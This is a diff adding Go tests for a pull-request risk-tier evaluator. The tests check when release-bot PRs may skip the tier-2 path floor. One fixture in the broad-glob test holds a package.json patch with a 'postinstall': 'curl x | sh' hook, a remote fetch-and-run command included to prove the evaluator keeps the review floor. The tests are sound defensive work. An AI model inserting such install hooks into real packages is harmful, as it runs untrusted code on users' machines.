@@ -573,3 +573,130 @@ func TestMappingV2Threshold(t *testing.T) {
 		})
 	}
 }
+
+func TestReleaseOnlyWaivesTier2PathFloor(t *testing.T) {
+	t.Parallel()
+	doc := strings.Replace(tiersYAML, `paths: ["backend/internal/auth/**", "infra/**"]`, `paths: ["backend/internal/auth/**", "infra/**", ".release-please-manifest.json"]`, 1)
+	relCfg := strings.Replace(doc, `heads: ["develop", "release-please--*"]`, `heads: ["develop", "release-please--*"]
+  author: "Release-Please[bot]"
+  paths: [".release-please-manifest.json", "CHANGELOG.md", "**/CHANGELOG.md", "package.json", "package-lock.json"]
+  version_files: ["package.json", "package-lock.json"]`, 1)
+	noAuthor := strings.Replace(relCfg, `author: "Release-Please[bot]"`, `author: ""`, 1)
+	manifest := File{Path: ".release-please-manifest.json", Status: "modified", Additions: 1, Deletions: 1}
+	changelog := File{Path: "pkg/CHANGELOG.md", Status: "modified", Additions: 3}
+	tests := []struct {
+		name      string
+		cfg       string
+		author    string
+		bot       bool
+		head      string
+		files     []File
+		wantTier  int
+		wantFloor bool
+	}{
+		{"release author release paths only", relCfg, "release-please[bot]", true, "release-please--branches--main", []File{manifest, changelog}, 1, false},
+		{"human author same branch", relCfg, "mallory", false, "release-please--branches--main", []File{manifest, changelog}, 2, true},
+		{"release author extra src file", relCfg, "release-please[bot]", true, "release-please--branches--main", []File{manifest, lines("src/a.go", 1)}, 2, true},
+		{"release author extra tier2 file", relCfg, "release-please[bot]", true, "release-please--branches--main", []File{manifest, lines("infra/main.tf", 1)}, 2, true},
+		{"release author control file", relCfg, "release-please[bot]", true, "release-please--branches--main", []File{manifest, lines(".github/workflows/ci.yml", 1)}, 2, true},
+		{"release author non-release head", relCfg, "release-please[bot]", true, "feat/x", []File{manifest}, 2, true},
+		{"feature off without author", noAuthor, "release-please[bot]", true, "release-please--branches--main", []File{manifest, changelog}, 2, true},
+		{"feature off without release.paths", doc, "release-please[bot]", true, "release-please--branches--main", []File{manifest}, 2, true},
+		{"rename from non-release path", relCfg, "release-please[bot]", true, "release-please--branches--main", []File{manifest, {Path: "CHANGELOG.md", PreviousPath: "infra/notes.txt", Status: "renamed"}}, 2, true},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			in := base(t)
+			in.Tiers = mustTiers(t, tc.cfg)
+			in.Author, in.AuthorBot, in.HeadRef, in.Files = tc.author, tc.bot, tc.head, tc.files
+			in.ReleaseCommitsVerified = true
+			r := Evaluate(in)
+			if r.DetTier != tc.wantTier || slices.Contains(floorRules(r), "tier2_path") != tc.wantFloor {
+				t.Fatalf("det = %d floors = %v, want tier %d tier2_path=%v", r.DetTier, floorRules(r), tc.wantTier, tc.wantFloor)
+			}
+			if slices.Contains(floorRules(r), "tier2_path_waived") == tc.wantFloor {
+				t.Fatalf("waiver marker missing or spurious: %v", floorRules(r))
+			}
+			if tc.head != "feat/x" && r.Lane != "release" {
+				t.Fatalf("lane = %s", r.Lane)
+			}
+		})
+	}
+}
+
+func TestReleaseOnlyNeedsVerifiedCommits(t *testing.T) {
+	t.Parallel()
+	in := base(t)
+	in.Tiers = mustTiers(t, strings.Replace(strings.Replace(tiersYAML, `"infra/**"]`, `"infra/**", ".release-please-manifest.json"]`, 1), `release-please--*"]`, `release-please--*"]
+  author: "release-please[bot]"
+  paths: [".release-please-manifest.json"]`, 1))
+	in.Author, in.AuthorBot, in.HeadRef = "release-please[bot]", true, "release-please--branches--main"
+	in.Files = []File{{Path: ".release-please-manifest.json", Status: "modified", Additions: 1}}
+	if r := Evaluate(in); r.DetTier != 2 {
+		t.Fatalf("unverified commits waived: %d", r.DetTier)
+	}
+}
+
+func TestBroadReleaseGlobNeverWaivesManifest(t *testing.T) {
+	t.Parallel()
+	doc := strings.Replace(strings.Replace(tiersYAML, `"infra/**"]`, `"infra/**", "package.json"]`, 1), `release-please--*"]`, `release-please--*"]
+  author: "release-please[bot]"
+  paths: ["*.json", "CHANGELOG.md"]`, 1)
+	in := base(t)
+	in.Tiers = mustTiers(t, doc)
+	in.Author, in.AuthorBot, in.HeadRef, in.ReleaseCommitsVerified = "release-please[bot]", true, "release-please--branches--main", true
+	in.Files = []File{{Path: "package.json", Status: "modified", Additions: 2, Deletions: 1, Patch: "@@ -1 +1,2 @@\n-  \"version\": \"1.0.0\",\n+  \"version\": \"1.1.0\",\n+  \"postinstall\": \"curl x | sh\","}}
+	if r := Evaluate(in); r.DetTier != 2 || !slices.Contains(floorRules(r), "tier2_path") {
+		t.Fatalf("det %d floors %v", r.DetTier, floorRules(r))
+	}
+}
+
+func TestVersionBumpShape(t *testing.T) {
+	t.Parallel()
+	doc := strings.Replace(strings.Replace(tiersYAML, `"infra/**"]`, `"infra/**", "package.json", "package-lock.json", ".release-please-manifest.json"]`, 1), `release-please--*"]`, `release-please--*"]
+  author: "release-please[bot]"
+  paths: ["package.json", "package-lock.json", ".release-please-manifest.json"]
+  version_files: ["package.json", "package-lock.json"]`, 1)
+	pair := func(o, n string) string { return "-  \"version\": \"" + o + "\",\n+  \"version\": \"" + n + "\"," }
+	patch := func(body string, add, del int, path string) File {
+		return File{Path: path, Status: "modified", Additions: add, Deletions: del, Patch: "@@ -1 +1 @@\n" + body}
+	}
+	pkg := func(o, n string) File { return patch(pair(o, n), 1, 1, "package.json") }
+	lock := func(pairs int, o, n string) File {
+		body := pair(o, n)
+		for i := 1; i < pairs; i++ {
+			body += "\n context\n" + pair(o, n)
+		}
+		return patch(body, pairs, pairs, "package-lock.json")
+	}
+	man := func(v string) File {
+		return File{Path: ".release-please-manifest.json", Status: "modified", Additions: 1, Deletions: 1, Patch: "@@ -1 +1 @@\n-  \".\": \"0.3.19\"\n+  \".\": \"" + v + "\""}
+	}
+	tests := []struct {
+		name  string
+		files []File
+		want  int
+	}{
+		{"real-shaped release", []File{man("0.3.20"), pkg("0.3.19", "0.3.20"), lock(2, "0.3.19", "0.3.20")}, 1},
+		{"lone added version line", []File{patch("+  \"version\": \"1.0.0\",", 1, 0, "package.json")}, 2},
+		{"two pairs in package.json", []File{patch(pair("0.3.19", "0.3.20")+"\n context\n"+pair("0.3.19", "0.3.20"), 2, 2, "package.json")}, 2},
+		{"three lockfile pairs", []File{pkg("0.3.19", "0.3.20"), lock(3, "0.3.19", "0.3.20")}, 2},
+		{"lockfile bumps a different version", []File{pkg("0.3.19", "0.3.20"), lock(2, "0.3.19", "0.3.21")}, 2},
+		{"no-op bump", []File{pkg("0.3.20", "0.3.20")}, 2},
+		{"manifest disagrees", []File{man("0.4.0"), pkg("0.3.19", "0.3.20")}, 2},
+		{"pair not adjacent", []File{patch("-  \"version\": \"0.3.19\",\n context\n+  \"version\": \"0.3.20\",", 1, 1, "package.json")}, 2},
+	}
+	for _, tc := range tests {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			in := base(t)
+			in.Tiers = mustTiers(t, doc)
+			in.Author, in.AuthorBot, in.HeadRef, in.ReleaseCommitsVerified = "release-please[bot]", true, "release-please--branches--main", true
+			in.Files = tc.files
+			if r := Evaluate(in); r.DetTier != tc.want {
+				t.Fatalf("det %d floors %v, want %d", r.DetTier, floorRules(r), tc.want)
+			}
+		})
+	}
+}
